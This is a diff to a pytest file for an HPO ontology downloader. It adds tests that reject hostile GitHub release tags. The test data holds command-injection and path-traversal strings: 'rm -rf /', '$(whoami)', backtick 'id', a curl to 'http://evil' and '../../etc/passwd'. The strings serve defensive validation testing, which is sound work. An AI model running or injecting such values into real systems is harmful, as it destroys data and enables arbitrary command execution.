@@ -11,7 +11,31 @@ from structlog.testing import capture_logs
 
 from hpo_link.constants import GITHUB_RELEASES_LATEST_URL
 from hpo_link.exceptions import DownloadError
-from hpo_link.ingest.downloader import download_file, resolve_latest_version
+from hpo_link.ingest.downloader import (
+    download_file,
+    resolve_latest_version,
+    validate_release_version,
+)
+
+# Upstream is attacker-influenceable: the GitHub release tag is chosen by whoever
+# publishes the HPO release. A resolved version flows into a privileged
+# contents-write workflow (build-data.yml) and into the OBO PURL request path, so
+# it MUST be pinned to the exact ISO date grammar HPO ships (e.g. 2026-06-06).
+_HOSTILE_TAGS = [
+    "v1.0.0; rm -rf /",
+    "$(whoami)",
+    "`id`",
+    "2026-06-06 && curl http://evil",
+    "2026-06-06\nrm -rf /",
+    "../../etc/passwd",
+    "2026-06-06/../../../etc",
+    "2026_06_06",
+    "26-6-6",
+    "2026-06-06extra",
+    "2026-06-06 ",
+    "",
+    "vvvvv",
+]
 
 
 def _settings(tmp_path: Path) -> object:
@@ -28,6 +52,36 @@ def test_resolve_latest_version() -> None:
     )
     with httpx.Client() as c:
         assert resolve_latest_version(c) == "2026-06-06"
+
+
+def test_validate_release_version_accepts_iso_date() -> None:
+    assert validate_release_version("2026-06-06") == "2026-06-06"
+
+
+@pytest.mark.parametrize("tag", _HOSTILE_TAGS)
+def test_validate_release_version_rejects_hostile(tag: str) -> None:
+    """A version failing the strict ISO-date grammar is rejected pre-output."""
+    with pytest.raises(DownloadError):
+        validate_release_version(tag)
+
+
+@respx.mock
+def test_resolve_latest_version_rejects_shell_metacharacters() -> None:
+    """A hostile release tag never reaches GITHUB_OUTPUT / the PURL path."""
+    respx.get(GITHUB_RELEASES_LATEST_URL).mock(
+        return_value=httpx.Response(200, json={"tag_name": "v2026-06-06; rm -rf /"})
+    )
+    with httpx.Client() as c, pytest.raises(DownloadError):
+        resolve_latest_version(c)
+
+
+@respx.mock
+def test_resolve_latest_version_rejects_command_substitution() -> None:
+    respx.get(GITHUB_RELEASES_LATEST_URL).mock(
+        return_value=httpx.Response(200, json={"tag_name": "$(whoami)"})
+    )
+    with httpx.Client() as c, pytest.raises(DownloadError):
+        resolve_latest_version(c)
 
 
 @respx.mock
